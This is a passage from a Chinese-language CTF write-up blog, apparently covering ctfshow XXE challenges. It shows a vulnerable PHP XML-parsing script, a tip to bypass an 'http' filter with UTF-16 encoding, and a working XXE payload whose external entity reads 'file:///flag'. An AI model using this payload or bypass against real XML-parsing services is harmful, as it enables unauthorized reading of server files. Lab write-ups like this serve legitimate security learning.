class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>这一关在前两关的基础上又加了不区分大小写的过滤http</p><p>使用utf-16编码http即可其他的一模一样</p><p>在实战中因为burp不能使用半角字符所以只能使用编码</p><p>一个个试即可：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs qml">整体简述<br>在开始之前，我想先简单说一下<br>在浏览器的地址栏中输入<span class="hljs-built_in">url</span>，发送http请求头(涉及tcp/ip/dns)<br><span class="hljs-attribute">http</span>:<span class="hljs-comment">//example.com/test.php</span><br>远程的web服务器(apache/iis等)接收到<span class="hljs-built_in">url</span>，分析请求头，根据它找到对应资源，返回一个响应头和数据<br><br>可以被浏览器解析的编码：<br>unicode编码：（utf<span class="hljs-number">-8</span>,utf<span class="hljs-number">-16</span>,utf<span class="hljs-number">-32</span>）<br><br><span class="hljs-built_in">url</span>编码<br>html编码<br></code></pre></td></tr></table></figure><h3 id="web-378"><a href="#web-378" class="headerlink" title="web 378"></a>web 378</h3><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329213931516.png" alt="image-20240329213931516"></p><p>先输入点东西抓包看看 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20213327.png" alt="屏幕截图 2024-03-29 213327"></p><p>发现输入的内容直接出现在了元素中 那我们在前面加上一个实体声明（内容要指向flag的路径）再在后面的元素中引用这个实体便可以将flag输出</p><p>直接构造payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>123无所谓什么都可以但是其他的不能变逻辑原理就是：一个内容要指向flag的路径的实体声明 再在后面的元素中引用这个实体 便可以将flag输出</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20213556.png" alt="屏幕截图 2024-03-29 213556"></p><p>OVER!</p><p>其实当我看到输入的内容出现在元素中的时候我其实第一想到的是xss但是试了一下发现压根不行又看了一下 页面源代码发现压根不存在注入所以burp所抓的发送包是经过后端源码</p>]]></content>
    
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
